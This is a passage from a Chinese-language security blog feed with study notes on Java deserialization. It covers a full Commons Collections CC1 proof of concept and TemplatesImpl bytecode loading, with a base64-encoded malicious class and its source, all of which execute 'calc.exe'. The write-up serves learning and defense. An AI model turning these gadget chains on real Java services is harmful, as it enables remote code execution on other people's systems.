class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(runtime);<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(invoke);<br></code></pre></td></tr></table></figure><h3 id="利用ChainedTransformer"><a href="#利用ChainedTransformer" class="headerlink" title="利用ChainedTransformer"></a>利用ChainedTransformer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">InvokerTransformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>       chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1Finsh</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br><br>       Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>       &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        objectObjectHashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, decorate);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TemplatesImpl加载字节码</title>
    <link href="/2022/03/01/TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2022/03/01/TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h1><p>上一篇说到加载字节码。用到了<code>url</code>的<code>loadclass</code>和<code>classloader</code>的<code>defineclass</code>但是呢被其作用域限制住了。<br>那我就会想到怎么去找其他类看看会不会又间接调用<code>defineclass</code>的（当然这是在我复习的时候才会想到的+分析了许多的漏洞），这是以后必须养成的习惯（间接！）</p><h2 id="TemplatesImple"><a href="#TemplatesImple" class="headerlink" title="TemplatesImple"></a>TemplatesImple</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012025891.png" alt="QQ截图20220301202453"></p><p>清晰可见这里的<code>defineClass</code>没有了<code>protect</code>，没有作用域？不，它这里的不写，就默认代表了<code>default</code>类，<strong>这是可以被外部调用的</strong>。</p><p>回溯一下。哪里调用了<code>defineClass</code>的<code>TransletClassLoader</code>方法。发现了在<code>TemplatesImpl</code>类中只有 <code>defineTransletClasse</code>调用了。于是继续回溯，查看哪里调用了<code>defineTransletClasse</code>。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250229.png" alt="QQ截图20220301203806"></p><p>显而易见的三种。</p><p>一个一个来看。</p><h4 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h4><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoThree</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(obj,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>下面解释为什么要反射修改属性值。<br><strong>首先我们注意到在<code>TemplatesImp</code>类中<code>_name</code>、<code>__tfactory</code>、<code>__bytecodes</code>三个属性值都为null。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250759.png" alt="QQ截图20220301221853"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012219267.png" alt="QQ截图20220301221915"></p><p>我们跟着链子走，首先来到。<code>getTransletInstance()</code></p><h4 id="name"><a href="#name" class="headerlink" title="_name"></a>_name</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250225.png" alt="QQ截图20220301220948"></p><p>显而易见如果为null则退出。</p><h4 id="bytecodes"><a href="#bytecodes" class="headerlink" title="_bytecodes"></a>_bytecodes</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250456.png" alt="QQ截图20220301221448"></p><p>显而易见。</p><p>这里的一个小细节。上面截图已经放出。是<code>_bytecodes[ ] [ ] </code>，这里就需要转换一下。<code>new byte[][]&#123;code&#125;</code></p><h4 id="tfactory"><a href="#tfactory" class="headerlink" title="_tfactory"></a>_tfactory</h4><p>它属于<code>TransformerFactoryImpl</code>类，给个<code>new TransformerFactoryImpl()</code>就行</p><h4 id="class"><a href="#class" class="headerlink" title=".class"></a>.class</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EivlTwo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EivlTwo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012238593.png" alt="QQ截图20220301223850"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250011.png" alt="QQ截图20220301223936"></p><p>这里还需要将class文件的类继承<code>AbstractTranslet</code>,不然会读取字节码失败（默认值为-1，进入&lt;0）。也就是无法获取base64中的内容。</p><p>然后就是要触发transform()。<br>对着它的构造来构造一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012255411.png" alt="QQ截图20220301225539"></p><p>至此就结束啦。</p><h3 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h3><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>由于该类的<code>getOutputProperties()</code>会触发<code>newTransformer()</code>，那么其实类型是一样的。只需要修改</p><p> obj.newTransformer();—-&gt;obj.getOutputProperties();<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250693.png" alt="QQ截图20220301223027"></p><h3 id="利用链3"><a href="#利用链3" class="headerlink" title="利用链3"></a>利用链3</h3><p>注意上篇就说到</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;类名&quot;</span>)</span>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;类名&quot;</span>, 是否初始化类, 类加载器)</span>，而<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>loadClass默认不会初始化类方法。<br></code></pre></td></tr></table></figure><p>这里是一个道理：<code>getTransletIndex ()方法</code>就是没又去实例化该对象。而其他两个方法都有。所以无法触发。</p><p>总结（只用到了两条。而这两条也就只是多了一条回溯而已。）</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java动态加载字节码</title>
    <link href="/2022/03/01/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2022/03/01/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
